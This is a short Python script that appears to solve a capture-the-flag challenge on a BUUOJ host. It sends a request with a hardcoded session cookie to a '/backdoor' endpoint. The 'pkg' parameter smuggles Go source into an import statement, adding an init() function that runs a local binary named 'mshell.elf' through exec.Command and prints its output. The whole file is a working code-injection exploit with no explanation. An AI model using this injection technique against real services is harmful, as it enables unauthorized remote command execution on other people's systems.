import requests

cookies = {"session":"MTY3NzMwMDYwMHxEdi1CQkFFQ180SUFBUkFCRUFBQVJfLUNBQUVHYzNSeWFXNW5EQWtBQjNOb1lXeHNiM2NHYzNSeWFXNW5EQ2dBSmk5MGJYQXZZVE01WmpZNE1tUmlaams0WmpZeFltTmlZbUkzWWpFME5HRTVZbVl4TkRVdnzAZDGCnyxMNEDUMsPtUIKzyZEmPpO0BRqsvA8AE6aKWA=="}
pkg = "\"os/exec\"\n fmt\"\n)\n\nfunc\tinit(){\ncmd:=exec.Command(\"./mshell.elf\")\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n}\n\n\nvar(a=\"1"
url = f'http://474bce15-c3d7-4395-a841-2dca0f599f60.node4.buuoj.cn:81/backdoor?pkg={pkg}'
headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}


res = requests.get(url, cookies=cookies,headers=headers).text
print(res)
